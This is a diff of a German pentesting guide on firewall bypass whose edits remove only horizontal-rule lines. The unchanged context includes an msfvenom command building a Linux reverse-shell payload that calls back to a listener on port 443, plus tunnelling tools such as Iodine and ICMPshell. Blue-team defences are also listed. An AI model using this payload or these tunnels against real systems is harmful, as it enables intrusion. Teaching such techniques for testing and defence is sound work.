@@ -1,6 +1,6 @@
 # 🔥 Firewall Bypass – Techniken, Tools & Schutzmaßnahmen
 
----
+
 
 ## Inhaltsverzeichnis
 - [Einleitung](#einleitung)
@@ -12,7 +12,7 @@
 - [Lernressourcen)](#lernressourcen)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Einleitung
 
@@ -23,7 +23,6 @@ Firewalls sind Sicherheitsmechanismen, die den Netzwerkverkehr auf Basis definie
 
 Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z. B. durch Tarnung oder Manipulation des Traffics. Dieses Wissen ist für **Pentester** und **Security Analysts** essenziell, um Schwächen in der Konfiguration zu erkennen.
 
----
 
 ## Arten von Firewalls
 
@@ -36,7 +35,7 @@ Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z.
 | Host-Based Firewall      | Lokal auf Systemen (z. B. Windows Defender Firewall) |
 | Next-Gen Firewalls       | Kombinieren mehrere Funktionen inkl. IDS/IPS        |
 
----
+
 
 <div align=right>
 
@@ -51,7 +50,7 @@ Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z.
 - Vermeiden der Detektion durch Security-Systeme
 - Platzieren von Payloads oder Backdoors
 
----
+
 
 ## Häufige Techniken zur Umgehung
 
@@ -111,7 +110,7 @@ Reverse Shell über HTTPS:
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > shell.elf
 ```
 
----
+
 
 <div align=right>
 
@@ -130,7 +129,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 | Iodine     | DNS-Tunnel                                 |
 | ICMPshell  | Shell über Ping                            |
 
----
+
 
 ## Verteidigungsmaßnahmen (Blue Team)
 
@@ -141,7 +140,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 - WAF-Härtung: Regeln regelmäßig aktualisieren, Obfuskation erkennen
 - Application Layer Filtering: DNS, HTTP, ICMP gezielt prüfen
 
----
+
 
 ## Lernressourcen
 
@@ -150,7 +149,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 - YouTube: John Hammond, The Cyber Mentor – „Firewall Evasion Techniques“
 - Bücher: „The Hacker Playbook 3“, „Nmap Network Scanning“
 
----
+
 
 ## Haftungsausschluss
 
